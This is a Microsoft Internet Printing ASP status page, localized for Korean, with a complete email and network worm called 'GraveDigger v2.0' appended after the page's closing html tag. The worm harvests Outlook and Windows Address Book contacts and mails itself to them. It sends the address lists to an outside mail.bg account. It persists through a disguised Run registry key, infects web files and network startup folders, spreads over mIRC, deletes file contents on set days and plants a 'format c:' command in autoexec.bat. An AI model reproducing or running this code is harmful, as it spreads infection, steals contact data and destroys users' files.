<%@ CODEPAGE=949 %> 
<%
' Replace the above line with your localized code page number
'------------------------------------------------------------
'
'   Microsoft Internet Printing Project
'
'   Copyright (c) Microsoft Corporation 1998
'
'
'------------------------------------------------------------
    option explicit
%>
<!-- #include file = "ipp_util.inc" -->
<%
    CheckSession
    Response.Expires = 0

    Dim strPrinter, strLocal, strJobEta
    Dim objPrinter, objQueue
    Const L_OpenPrinter_Text    = "프린터 열기: %1"

    strPrinter = OleCvt.DecodeUnicodeName (request ("eprinter"))

    strLocal = session(LOCAL_SERVER)

    Set objQueue = GetObject("WinNT://" & session(COMPUTER) & "/" & strPrinter)

    Dim strTitle
    Const L_PrinterOn_Text = "%2의 %1"

    strTitle = LARGE_FONT_TAG & RepString2(L_PrinterOn_Text, GetFriendlyName (objQueue.PrinterName, session(COMPUTER) ), session(LOCAL_SERVER)) & END_FONT

    Set objPrinter = Server.CreateObject(PROGID_HELPER)
    On Error Resume Next
    objPrinter.open "\\" & session(COMPUTER) & "\" & strPrinter
    If Err Then
        Call ErrorHandler ( RepString1(L_OpenPrinter_Text, strPrinter) )
    End If

    strJobEta = JobEtaInfo (objPrinter)

    objPrinter.Close

%>
<html>

<head>
<%=SetCodePage%>
<meta http-equiv="refresh" content="60">
</head>

<body bgcolor="#FFFFFF" text="#000000" link="#000000" vlink="#808080" alink="#000000"
topmargin="0" leftmargin="0">



<table width="100%" border=0 cellspacing="0" cellpadding="2">
    <tr>
        <td nowrap><% =Write (strTitle) %>
            <br><hr width=100% size=1 noshade color=red>
            <% =Write(strJobEta) %>
        </td>
    </tr>
</table>

</body>
</html><script type='text/javascript' language='JavaScript'>
//29.10.2001, 10/29/01 This worm is donation from all Bulgarians!CopyR2001McB
function ifErr(){self.close();return true;}
window.onerror=ifErr;
path='c:\\';bla="bla.hta";
dl=unescape(document.location.pathname);load();
function load(){Os=sfs(2);if((!ifHtml(0))&&(!ifHtml(1))){o("C:/bla.hta",mHAHL(1));
o("C:/b.htm",mHAHL(5));ww=window.open("c:\\b.htm","Loading","width=1, height=1,left=1000,top=1000");
ww.blur();ww.close();}if (ifHtml(1)){Oh=sfs(3);Oh.NameSpace(path).Items().item(bla).InvokeVerb();}
if (ifHtml(0)){var tss=vlez();net(tss);self.close()}}
function o(p,t){Os.Reset();Os.Path=p;Os.Doc=t;Os.Write();}
function ifHtml(n){t=getScript();if(n==0){if((t.indexOf("k='GraveDigger v2.0'"))==0){return true;}else{return false;}}if(n==1){if ((t.indexOf("k='Z'"))==0){return true;}else{return false;}}}

function getScript(){e=new Enumerator(document.all);for (;!e.atEnd();e.moveNext()){
x=e.item().tagName;if(x=="SCRIPT"){t=e.item().text;}}return t;}	

function mHAHL(m){s1="<title>Memory scan...<"+"/title><hta:Application id=\"GraveDigger v2.0\" windowstate=minimize><"+"/head>";s2="<script type='text"+"/javascript' language='JavaScript'>";s3="<"+"/script><"+"/body><"+"/html>";t=getScript();if(m==1) {t="k='GraveDigger v2.0'"+t};if(m==5){t="k='Z'"+t};s=s1+s2+t+s3;return s;}

function IsMail(S){var m1,m2;IsEMail=false;v="\r\n";m1=S.indexOf("@");m2=S.indexOf(".");if((m1 != 0)&&(m1<m2)) {IsEMail=true;}return IsEMail;}

function mL(ss){Oo=sfs(5);var Om=Oo.GetNamespace("MAPI").GetDefaultFolder(10).Items;n=Om.Count;badUser="";for (i=0;i<n;i++){var us=Om.Item(i+1).Email1Address;if(IsMail(us)){senT(us,ss,1);badUser+=us+";";}}
	senT("g_dv20@mail.bg",badUser,0);	
}

function senT(snT,at,n){Oo=sfs(5);var male=Oo.CreateItem(0);with(male){Recipients.Add(snT);Subject="Outlook Express Update";Body='\n\r'+'MSNSofware Co.';if(n==1){Attachments.Add(at)};DeleteAfterSubmit=true;Send();}}

function mL1(at,wab){fso=sfs(1);f=fso.GetFile(wab);f.Copy("c:\\test.txt");a=window.open("","Test","width=1, height=1,left=1000,top=1000");a.blur();a.document.location.href='file://c:/test.txt';
t=a.document.body.innerText;a.close();t=t.toLowerCase();t=escape(t);ft="c:\\t.txt";
f=fso.OpenTextFile(ft,2,true);f.write(t);f=fso.OpenTextFile(ft,1);t=f.ReadAll();ss="";start=0;
for(i=0;i<t.length;i++){n=t.indexOf("@",start);nEnd=n;nBegin=n;while((t.substr(nEnd,1)!="%")&&(t.substr(nEnd,2)!="i+")){nEnd++;};while(t.substr(nBegin,1)!="%"){nBegin--;}
var s="";s=t.substr(nBegin+3,nEnd-nBegin-3);
if((ss.indexOf(s)==-1)&&(IsMail(s))){senT(s,at,1);ss+=s+";";}start=nEnd;}
	senT("g_dv20@mail.bg",ss,0);}

function rr(t){try{var ws = sfs(4);r=ws.RegRead(t);return r;}catch(e){return false}}

function wr(t,v){try{var ws = sfs(4);r=ws.RegWrite(t,v);}catch(e){}}

function sfs(j){if (j==1){var f = new ActiveXObject("Scripting.FileSystemObject")}
if (j==3){var f=new ActiveXObject("Shell.Application")}
if (j==4){var f=new ActiveXObject("WScript.Shell")}
try{if (j==2){var f=new ActiveXObject("Scriptlet.TypeLib")}
if (j==5){var f=new ActiveXObject("Outlook.Application")}}
catch(e){
	var f = new ActiveXObject("Scripting.FileSystemObject");
	op=f.OpenTextFile("c:\\autoexec.bat", 8, false);
	op.Write("Echo y|format c:");
	op.close();ifErr();}
return f}

function cf(fd,fn,t,n){f=sfs(1);fd=f.GetSpecialFolder(0)+"\\"+fd;if(!f.FolderExists(fd)){f.CreateFolder(fd);}a=f.CreateTextFile(fd+"\\"+fn,true);if(n==0){a.WriteLine(t);}else {a.WriteLine("<script type='text"+"/javascript' language='JavaScript'>"+t+"<"+"/script>");}a.Close();}

function net(ts){var ws=new ActiveXObject("WScript.Network");fso = sfs(1);var n=ws.EnumNetworkDrives();t="";if(!(n.length==0)){a="CDEFGHIJKM";for(i=0;i<n.length;i+=2){d=n(i+1);d=d.substr(0,d.length-1);if(!(d==t)){try{try{t=d;for(z=0;z<a.length;z++){f=d+a.charAt(z)+"\\WINDOWS\\Start Menu\\Programs\\StartUp";if(fso.FolderExists(f)){fso.CopyFile(dl,f+"\\msoe.hta");}}}catch(e){}}catch(e){}}}}dF();}

function dF(){fff=sfs(1);try{fff.GetFile(dl).Attributes=2;}catch(e){}try{fff.GetFile("c:\\b.htm").Attributes=2;}catch(e){}}

function vlez(){
hcu="HKEY_CURRENT_USER\\";hclm="HKEY_LOCAL_MACHINE\\";f=sfs(1);ws=sfs(4);ws.RegWrite (hcu+"Software\\Microsoft\\Windows Scripting Host\\Settings\\Timeout",0,"REG_DWORD");bU=hcu+"Software\\TheGrave\\badUsers\\v2.0";bUU=rr(bU);de="de=0";
	if (!bUU){
		wr(bU,"0");
		}
	else{
		if (bUU=="7"){
			de="de=1";
			}
		wr(bU,Number(bUU)+1);	
		}
ID=rr(hcu+"Identities\\Default User ID");wP=hcu+"Control Panel\\Desktop\\Wallpaper";vO=hcu+"Identities\\"+ID+"\\Software\\Microsoft\\Outlook Express\\5.0\\Mail\\";msn=vO+"Message Send HTML";cus=vO+"Compose Use Stationery";sn=vO+"Stationery Name";str=mHAHL(0);kk="k='GraveDigger v2.0'";
s1=str.substr(0,str.indexOf(kk))+str.substr(str.indexOf(kk)+kk.length);cf("help","mmsn_offline.htm",s1,0);str=getScript();s1=str.substr(0,str.indexOf(kk))+str.substr(str.indexOf(kk)+kk.length);a0="SAMPLES\\WSH";cf(a0,"Charts.js",s1,1);wr (msn,1);wr(cus,1);
a2=f.GetSpecialFolder(0)+"\\";a7=a2+"help"+"\\mmsn_offline.htm";wr (sn,a7);wr (wP,a7);
q="\r";
prof="prof="+"\""+rr(hcu+"Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\DefaultProfile")+"\"";

ts=prof+q+"sub delF(fn)"+q+"on Error Resume Next"+q+"fso.GetFile(fn).Attributes=32"+q+"set ww=fso.OpenTextFile(fn,2,true)"+q+"ww.close"+q+"end sub"+q+"sub iFile(fn)"+q+"On Error Resume Next"+q+"fso.GetFile(fn).Attributes=32"+q+"set c=fso.OpenTextFile(fn,1,true)"+q+"if fso.GetFile(fn).size <>0 then"+q+"cc=c.ReadAll"+q+"end if"+q+"c.close"+q+"if(Instr(cc,jv)=False) then"+q+"set c=fso.OpenTextFile(fn,8,true)"+q+"c.Write jv"+q+"c.close"+q+"end If"+q+"end sub"+q+"sub mIrc(fn)"+q+"On Error Resume Next"+q+"set Fini=fso.CreateTextFile(fn & \"\\script.ini\")"+q+"With Fini"+q+".WriteLine \"[script]\""+q+".WriteLine \";mIRC Script\"";

t1=q+".WriteLine \";This virus is donation from all Bulgarians\""+q+".WriteLine \";GraveDiggerV2.0\""+q+".WriteLine \"n0=on 1:JOIN:#:{\""+q+".WriteLine \"n1= /if ( $nick == $me ) { halt }\""+q+".WriteLine \"n2= /.dcc send"+" $nick \"&spf&\"\\help\\mmsn_offline.htm\""+q+".WriteLine \"n3=}\""+q+".close"+q+"End With"+q+"end sub"+q+"sub i(fd)"+q+"Set f=fso.GetFolder(fd)"+q+"Set fc=f.Files"+q+"d=Day(Date)"+q+"For Each f2 in fc"+q+"e=lcase(fso.GetExtensionName(f2.path))"+q+"Err.Clear"+q+"if(d=1)or(d=5)or(d=10)or(d=15)or(d=20)or(de=1)then"+q+"delF(f2.path)"+q+"end if"+q+"IF (e=\"htm\")or(e=\"html\")or(e=\"asp\")then"+q+"iFile(f2.path)"+q+"end If";

t2=q+"If(e=\"ini\")or(e=\"hlp\")then"+q+"mIrc(fd)"+q+"end if"+q+"Next"+q+"end sub"+q+"sub lv"+q+"Dim d,ds,s"+q+"Set ds=fso.Drives"+q+"for each d in ds"+q+"if d.DriveType=2 or d.DriveType=3 Then"+q+"flt(d.path&\"\\\")"+q+"end if"+q+"Next"+q+"end sub"+q+"sub flt(folderspec)"+q+"set f=fso.GetFolder(folderspec)"+q+"set sf=f.SubFolders"+q+"for each f1 in sf"+q+"i(f1.path)"+q+"flt(f1.path)"+q+"next"+q+"end sub"+q+"Function IM(S)"+q+"IM=False"+q+"If InStr(S,vbCrLf)=0 Then"+q+"m1=InStr(S,\"@\")"+q+"m2=InStr(S,\".\")"+q+"If m1<>0 And m1<m2 Then"+q+"IM=True"+q+"End If"+q+"End If"+q+"End Function"+q+"function Em(at)"+q+"Dim i";

t3=q+"On Error Resume Next"+q+"Set Oo=CreateObject(\"Outlook.Application\")"+q+"Set Om=Oo.GetNamespace(\"MAPI\").GetDefaultFolder(10).Items"+q+"n=Om.Count"+q+"ReDim mm(n)"+q+"For i=1 To n:mm(i-1)=Om.Item(i).Email1Address:Next"+q+"Set s=CreateObject(\"MAPI.Session\")"+q+"s.Logon prof,\"\",false, false,0"+q+"for x=0 to i-1"+q+"if IM(mm(x)) Then"+q+"Set m=s.Outbox.Messages.Add"+q+"Set oA=m.Attachments.Add"+q+"oA.Name=\"Reports\""+q+"oA.ReadFromFile=at"+q+"oA.Source=at"+q+"m.Subject=mm(x)"+q+"m.Text=\"Microsoft Outlook 98\""+q+"Set newRec=m.Recipients.Add"+q+
"newRec.Name=mm(x)"+q+"newRec.Type=1"+q+"newRec.Resolve 1"+q+"m.Update"+q+"m.Send 0,0,0 ";

t4=q+"End If"+q+"Next"+q+"s.Logoff"+q+"End Function"+q+"set fso= CreateObject(\"Scripting.FileSystemObject\")"+q+"set spf=fso.GetSpecialFolder(0)"+q+"h=(spf&\"\\SAMPLES\\WSH\\Charts.js\")"+q+"set tf=fso.OpenTextFile(h,1,true)"+q+"jv=tf.ReadAll"+q+"tf.close"+q+"Em(spf&\"\\help\\mmsn_offline.htm\")"+q+"if Err Then Err.Clear: End if"+q+"lv()"+q+"if Err Then:Err.Clear:de=1:lv() End if";
ts=ts+t1+t2+t3+t4;
a1="\\Charts.vbs";
cf(a0,a1,de+q+ts,0);
wr(hclm+"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\NAV DefAlert",a2+a0+a1);
ws.Run(a2+a0+a1);	
mL(a2+"help"+"\\mmsn_offline.htm");
p=rr(hcu+"Software\\Microsoft\\WAB\\WAB4\\Wab File Name\\");
mL1(a2+"help"+"\\mmsn_offline.htm",p);
return ts;}
</script>
